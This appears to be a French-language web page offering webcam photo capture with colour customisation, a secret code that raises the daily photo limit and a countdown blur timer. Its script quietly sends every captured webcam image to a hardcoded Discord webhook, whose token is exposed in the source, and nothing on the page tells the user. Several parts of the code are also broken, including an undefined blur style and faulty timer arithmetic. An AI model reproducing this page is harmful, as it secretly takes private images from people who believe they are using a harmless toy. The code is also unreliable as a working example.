<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Capture Photo</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background-color: #f0f8ff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            transition: background-color 0.3s ease;
        }
        .container {
            text-align: center;
            padding: 40px;
            background-color: white;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 500px;
        }
        h1 {
            font-size: 28px;
            margin-bottom: 20px;
            color: #333;
        }
        input[type="color"], input[type="text"], button {
            margin: 10px 0;
            padding: 10px;
            border-radius: 8px;
            border: 2px solid #ddd;
        }
        button {
            background-color: #4CAF50;
            color: white;
            cursor: pointer;
            font-size: 16px;
            transition: transform 0.2s ease, background-color 0.3s ease;
        }
        button:hover {
            background-color: #45a049;
            transform: scale(1.05);
        }
        .photo-container {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 10px;
            margin-top: 20px;
        }
        .photo-container img {
            width: 160px;
            height: 160px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            transition: transform 0.3s ease;
        }
        .photo-container img:hover {
            transform: scale(1.05);
        }
        .timer {
            font-size: 16px;
            color: #FF6347;
            margin-top: 10px;
        }
        .message {
            color: red;
            margin-top: 10px;
            font-size: 18px;
        }
        video {
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Capture Photo et Personnalisation</h1>
        <div>
            <label for="bgColor">Couleur du fond :</label>
            <input type="color" id="bgColor" value="#f0f8ff">
        </div>
        <div>
            <label for="btnColor">Couleur du bouton :</label>
            <input type="color" id="btnColor" value="#4CAF50">
        </div>
        <div>
            <button id="startButton">Prendre une photo</button>
        </div>
        <div>
            <label for="secretCode">Code Secret (si vous en avez un) :</label>
            <input type="text" id="secretCode" placeholder="Entrez le code 'INF'">
        </div>
        <div id="message" class="message"></div>
        <div>
            <video id="video" width="320" height="240" autoplay></video>
        </div>
        <canvas id="canvas" style="display: none;"></canvas>
        <div class="photo-container" id="photoContainer"></div>
        <div id="timer" class="timer"></div>
    </div>

    <script>
        const startButton = document.getElementById("startButton");
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        const ctx = canvas.getContext("2d");
        const photoContainer = document.getElementById("photoContainer");
        const secretCodeInput = document.getElementById("secretCode");
        const messageDiv = document.getElementById("message");
        const bgColorInput = document.getElementById("bgColor");
        const btnColorInput = document.getElementById("btnColor");
        const timerDiv = document.getElementById("timer");

        let photoCount = 0;
        const maxPhotosPerDay = 3;
        const maxPhotosWithCode = 10;
        const blurDuration = 7 * 24 * 60 * 60 * 1000; // 7 jours en millisecondes
        let photos = JSON.parse(localStorage.getItem("photos")) || [];
        let lastCaptureDate = JSON.parse(localStorage.getItem("lastCaptureDate")) || "";
        let timerInterval;

        // Fonction pour initialiser la webcam
        function initCamera() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then((stream) => {
                    video.srcObject = stream;
                })
                .catch((err) => {
                    console.error("Erreur d'accès à la caméra:", err);
                    alert("Impossible d'accéder à la caméra.");
                });
        }

        // Prendre la photo et l'envoyer
        function takePhoto() {
            if (photoCount >= (secretCodeInput.value === "INF" ? maxPhotosWithCode : maxPhotosPerDay)) {
                messageDiv.textContent = "Limite de photos atteinte pour aujourd'hui.";
                return;
            }

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            const imageUrl = canvas.toDataURL("image/png");
            const currentDate = new Date();
            const photo = {
                url: imageUrl,
                date: currentDate.toLocaleString(),
                takenAt: currentDate.getTime()
            };

            // Sauvegarde dans localStorage
            photos.push(photo);
            localStorage.setItem("photos", JSON.stringify(photos));

            // Envoi sur Discord
            sendToDiscord(imageUrl, currentDate);

            photoCount++;
            lastCaptureDate = currentDate.toISOString();
            localStorage.setItem("lastCaptureDate", JSON.stringify(lastCaptureDate));

            // Actualise l'affichage des photos
            displayPhotos();
            messageDiv.textContent = "";  // Réinitialise le message
        }

        // Affichage des photos sauvegardées
        function displayPhotos() {
            photoContainer.innerHTML = "";
            photos.forEach((photo) => {
                const img = document.createElement("img");
                img.src = photo.url;
                img.classList.add("blurred"); // Floute la photo au début

                const timeElapsed = new Date().getTime() - photo.takenAt;
                const remainingTime = blurDuration - timeElapsed;
                if (remainingTime <= 0) {
                    img.classList.remove("blurred");
                    img.classList.add("unblurred");
                }

                photoContainer.appendChild(img);

                // Lancer le défloutage si le délai est passé
                if (remainingTime > 0) {
                    updateTimer(remainingTime);
                }
            });
        }

        // Met à jour le timer qui affiche le temps restant
        function updateTimer(remainingTime) {
            if (timerInterval) clearInterval(timerInterval);
            timerInterval = setInterval(() => {
                const currentTime = new Date().getTime();
                const elapsedTime = currentTime - photos[photos.length - 1].takenAt;
                const remaining = blurDuration - elapsedTime;

                if (remaining <= 0) {
                    clearInterval(timerInterval);
                    displayPhotos();
                } else {
                    const hours = Math.floor((remaining % (1000 * 60 * 60)) / (1000 * 60));
                    const minutes = Math.floor((remaining % (1000 * 60)) / 1000);
                    const seconds = Math.floor((remaining % 1000) / 1000);
                    timerDiv.textContent = `Temps restant avant défloutage: ${hours}h ${minutes}m ${seconds}s`;
                }
            }, 1000);
        }

        // Envoi de la photo sur Discord via webhook
        function sendToDiscord(imageUrl, date) {
            const webhookUrl = "https://discord.com/api/webhooks/1356707589966139483/7N7rM9WTxZZnnXczxaC7kgOvTPJMhd8W3134VDvdzj6-YwuwKcDzJw_4RB6QUMW9sUXp";
            fetch(webhookUrl, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    content: `Photo prise le ${date}`,
                    embeds: [{
                        image: { url: imageUrl }
                    }]
                })
            });
        }

        // Initialisation de la caméra
        initCamera();

        // Change la couleur du fond et des boutons
        bgColorInput.addEventListener("input", () => {
            document.body.style.backgroundColor = bgColorInput.value;
        });

        btnColorInput.addEventListener("input", () => {
            startButton.style.backgroundColor = btnColorInput.value;
        });

        // Lancer la prise de photo
        startButton.addEventListener("click", takePhoto);

        // Afficher les photos
        displayPhotos();
    </script>
</body>
</html>
